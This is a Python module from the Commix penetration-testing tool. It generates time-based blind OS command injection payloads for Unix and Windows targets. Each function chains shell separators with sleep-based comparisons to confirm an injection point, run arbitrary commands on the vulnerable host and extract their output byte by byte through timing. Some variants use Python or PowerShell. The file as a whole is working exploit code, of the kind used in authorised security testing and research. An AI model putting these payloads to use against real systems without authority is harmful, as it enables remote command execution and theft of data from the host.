#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks
from src.thirdparty.six.moves import urllib as _urllib

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
The command's output as a shell word, through whichever substitution syntax is in play. Wrapped in
nothing else: a second substitution around it nests, which backticks cannot do without escaping,
and an 'echo' in between reads the backslashes of the output on every shell whose builtin does.
"""
def _output_word(cmd):
  return settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX

"""
How many bytes that output is. Counted the same way on every separator, and read back below the same
way: '${#var}' counts characters where this counts bytes, and a length that disagreed with the
indexing would have the retrieval ask for characters that are not where it was told they are.
"""
def _length_expr(word):
  return "$(printf '%s' \"" + word + "\" | wc -c)"

"""
The ordinal of the output's Nth byte, newlines counted among them. 'cut -c' would answer per line
instead, which is a different byte on any output that has more than one - and none at all for the
lines that are shorter than N.

A letter follows the byte inside the substitution, and only the first of the two is read: a
substitution drops the newlines it ends with, so a byte that is itself a newline would otherwise
come back as nothing at all and the position it sits at could never be resolved.
"""
def _ordinal_expr(word, num_of_chars):
  # '+' rather than a bare '+', which arrives as a space - and 'tail -c N' counts from the end.
  return ("$(printf '%d' \"'$(printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) +
          " | head -c 1; printf X)\")")

"""
The command's output, measured by the alternative interpreter. The output travels through a pipe
rather than into the program's own source: substituted there, a quote in it would close the string
literal it sits in and the payload would come back at once, having measured nothing.
"""
def _py_length_expr(cmd):
  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + _output_word(cmd) + "\"|" +
          settings.LINUX_PYTHON_INTERPRETER +
          " -c \"import sys;print(len(sys.stdin.buffer.read()))\"" + settings.CMD_SUB_SUFFIX)

"""
The ordinal of that output's Nth byte, read the same way. Indexing bytes answers with the number
itself, so nothing has to be converted afterwards.
"""
def _py_ordinal_expr(cmd, num_of_chars):
  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + _output_word(cmd) + "\"|" +
          settings.LINUX_PYTHON_INTERPRETER + " -c \"import sys;print(sys.stdin.buffer.read()[" +
          str(num_of_chars - 1) + "])\"" + settings.CMD_SUB_SUFFIX)

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # Comparing the marker straight back proves the command ran just as well as measuring its
      # length did, and spares the payload a PowerShell launch whose own start-up time is noise a
      # timing measurement cannot afford.
      payload = checks.windows_probe(chain, "echo " + TAG, "==", TAG, timesec)
  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
    elif separator == "&":
      payload = (separator +
                 "[ " + str(output_length) + " -eq " + _length_expr(TAG) + " ]" + "&&" +
                 "sleep " + str(timesec)
                 )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + _length_expr(TAG) + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
      payload = checks.windows_probe(chain, python_payload, "==", output_length, timesec)

  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator == "&":
      payload = (separator +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
Build a raw shell numeric comparison for false-positive checks; Unix-only.
"""
def condition_check(separator, condition, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return None
  if separator in (";", "\n", "\r\n"):
    payload = (separator +
              "[ " + condition + " ]" + separator +
              settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
              "sleep $((" + str(timesec) + "*(" + settings.RANDOM_VAR_GENERATOR + "==0)))"
              )
  elif separator == "&":
    payload = (separator +
              "[ " + condition + " ]" + "&&" +
              "sleep " + str(timesec)
              )
  elif separator in ("&", "&&", ""):
    payload = ("&" +
              "sleep 0" + separator +
              "[ " + condition + " ]" + separator +
              "sleep " + str(timesec)
              )
  elif separator in ("|", "||"):
    pipe = separator
    payload = (pipe +
              "[ ! " + condition + " ]" + "||" +
              "sleep " + str(timesec)
              )
  else:
    return None

  payload = checks.append_custom_marker(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Windows counterpart of condition_check() above - 'set /a' has no boolean test operator, so an
equality check is read off a subtraction landing on the expected value.
"""
def windows_condition_check(separator, expr, expected, timesec):
  chain = checks.windows_separator(separator)
  if chain is None:
    return None
  return checks.windows_probe(chain, "set /a " + expr, "==", expected, timesec)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", output_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                )

    elif separator == "&":
      payload = (separator +
                 "[ " + str(output_length) + " -eq " + _length_expr(word) + " ]" + "&&" +
                 "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + _length_expr(word) + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", output_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator == "&":
      payload = (separator +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -eq " + _py_length_expr(cmd) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + _py_length_expr(cmd) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Ordering (not equality) length check, so the output length can be binary searched.
"""
def get_length(separator, cmd, candidate_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "GEQ", candidate_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(candidate_length) + "<=$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                )

    elif separator == "&":
      payload = (separator +
                 "[ " + str(candidate_length) + " -le " + _length_expr(word) + " ]" + "&&" +
                 "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(candidate_length) + " -gt " + _length_expr(word) + " ]" + "||" +
                 "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "GEQ", candidate_length, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(candidate_length) + "<=${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator == "&":
      payload = (separator +
                 "[ " + str(candidate_length) + " -le " + _py_length_expr(cmd) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                 "[ " + str(candidate_length) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(candidate_length) + " -gt " + _py_length_expr(cmd) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  arith_operator = "<=" if operator == "-le" else "=="
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # The ordinal has to be computed on the target: cmd.exe's IF compares strings by locale
      # collation ('M' GEQ 'a' holds), so only a numeric compare can be binary searched.
      payload = checks.windows_probe(chain,
                                     "powershell.exe -InputFormat none write "
                                     "([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
                                     str(num_of_chars - 1) + ",1)))",
                                     win_operator, ascii_char, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    word = _output_word(cmd)
    qmarks = "?" * (num_of_chars - 1)
    var_ordinal_expr = "$(printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\")"
    ordinal_expr = _ordinal_expr(word, num_of_chars)

    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_expr + ")))"
                )

    elif separator == "&":
      payload = (separator +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + "&&" +
                "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                "sleep 0 " + separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ] " + separator +
                "sleep " + str(timesec)
                )

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + "||" +
                "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  arith_operator = "<=" if operator == "-le" else "=="
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
      payload = checks.windows_probe(chain, python_payload, win_operator, ascii_char, timesec)

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + _py_ordinal_expr(cmd, num_of_chars) + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&":
      payload = (separator +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + _py_ordinal_expr(cmd, num_of_chars) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + _py_ordinal_expr(cmd, num_of_chars) + separator +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + _py_ordinal_expr(cmd, num_of_chars) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", ascii_char, timesec)

  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&":
      payload = (separator +
                 "[ " + str(ascii_char) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.append_custom_marker(payload, separator)

  return checks.sanitize_payload_newlines(payload)

# eof
